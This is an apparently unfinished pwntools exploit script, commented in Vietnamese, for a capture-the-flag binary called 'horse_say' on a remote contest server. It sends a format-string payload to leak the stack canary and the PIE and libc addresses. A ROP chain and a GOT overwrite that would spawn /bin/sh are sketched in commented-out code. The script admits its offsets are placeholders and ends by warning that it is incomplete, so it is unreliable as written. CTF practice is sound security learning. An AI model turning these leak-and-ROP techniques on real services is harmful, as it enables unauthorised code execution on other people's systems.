#!/usr/bin/env python3
from pwn import *

# Cấu hình
context.binary = elf = ELF('./bin/horse_say')
# libc = ELF('./libc.so.6') # Cần file libc của server, hoặc dùng pwninit để tự động tìm
# p = process()
p = remote('pwn1.cscv.vn', 6789)

# Bỏ qua phần proof of work
p.recvuntil(b'solution: ')
solution = p.recvline().strip()
p.sendline(solution)

# ===== GIAI ĐOẠN 1: LEAK THÔNG TIN =====
# Giả sử Canary ở offset 39, PIE ở 41, Libc ở 43 (BẠN PHẢI TỰ TÌM OFFSET CHÍNH XÁC)
# Các giá trị offset này chỉ là ví dụ
CANARY_OFFSET = 39
PIE_OFFSET = 41
LIBC_OFFSET = 43

log.info("Bắt đầu leak thông tin...")
payload_leak = f'%{CANARY_OFFSET}$p.%{PIE_OFFSET}$p.%{LIBC_OFFSET}$p'.encode()
p.sendlineafter(b'Say something: ', payload_leak)

# Nhận và phân tích output
p.recvuntil(b'< ')
leaked_data = p.recvline().split(b'.')

# Trích xuất canary
canary = int(leaked_data[0], 16)
log.success(f"Leaked Canary: {hex(canary)}")

# Trích xuất và tính địa chỉ PIE base
leaked_pie = int(leaked_data[1], 16)
# Giả sử địa chỉ bị leak là từ hàm main + offset (cần debug để tìm offset chính xác)
# Ví dụ: elf.address = leaked_pie - (elf.symbols['main'] + 246)
# Con số 246 này phải tìm bằng GDB
elf.address = leaked_pie - 0x12c3 # Đây là offset ví dụ, bạn cần tự tìm
log.success(f"Leaked PIE Address: {hex(leaked_pie)}")
log.success(f"PIE Base Address: {hex(elf.address)}")

# Trích xuất và tính địa chỉ Libc base
# leaked_libc = int(leaked_data[2], 16)
# libc.address = leaked_libc - libc.symbols['__libc_start_main_ret'] # Hoặc offset tương tự
# log.success(f"Leaked Libc Address: {hex(leaked_libc)}")
# log.success(f"Libc Base Address: {hex(libc.address)}")

# ===== GIAI ĐOẠN 2: XÂY DỰNG VÀ GỬI ROP CHAIN =====

# Tìm gadgets và các địa chỉ cần thiết
# system_addr = libc.symbols['system']
# bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# pop_rdi_ret = next(elf.search(rop.find_gadget(['pop rdi', 'ret']).address))
# ret_addr = pop_rdi_ret + 1 # Gadget `ret` để căn chỉnh stack

# Vì bài này không có file libc, chúng ta có thể thử kỹ thuật ret2csu hoặc one_gadget
# Tuy nhiên, cách đơn giản nhất là tìm một hàm trong binary đã được link sẵn
# Ở đây, chúng ta có thể ghi đè GOT của một hàm nào đó (ví dụ: puts) thành system
# Nhưng cách trực tiếp nhất vẫn là ROP

# Ví dụ payload ROP (cần địa chỉ chính xác)
# rop_chain = b''
# rop_chain += p64(pop_rdi_ret)
# rop_chain += p64(bin_sh_addr)
# rop_chain += p64(ret_addr) # Căn chỉnh stack cho một số phiên bản libc
# rop_chain += p64(system_addr)

# payload = b'A' * offset_den_canary # Padding
# payload += p64(canary)
# payload += b'B' * 8 # Padding cho RBP
# payload += rop_chain

# Vì chúng ta không có libc, một cách tiếp cận khác có thể là:
# 1. Leak địa chỉ GOT của một hàm, ví dụ `puts`.
# 2. Leak một địa chỉ libc từ GOT của hàm khác.
# 3. Tính địa chỉ `system`.
# 4. Dùng format string để ghi đè GOT của `puts` thành địa chỉ `system`.
# 5. Gửi chuỗi "/bin/sh", khi chương trình gọi puts("/bin/sh") nó sẽ thực thi system("/bin/sh").

# Cách này phức tạp hơn. Có lẽ có một cách đơn giản hơn mà chúng ta đang bỏ lỡ.
# Quay lại với ROP, chúng ta cần libc. Nếu không có, hãy thử dùng tool online để tìm libc từ địa chỉ leak được
# https://libc.blukat.me/

# log.info("Gửi payload ROP...")
# p.sendline(payload)

log.warning("Script chưa hoàn chỉnh. Cần tìm offset và file libc chính xác.")
p.interactive()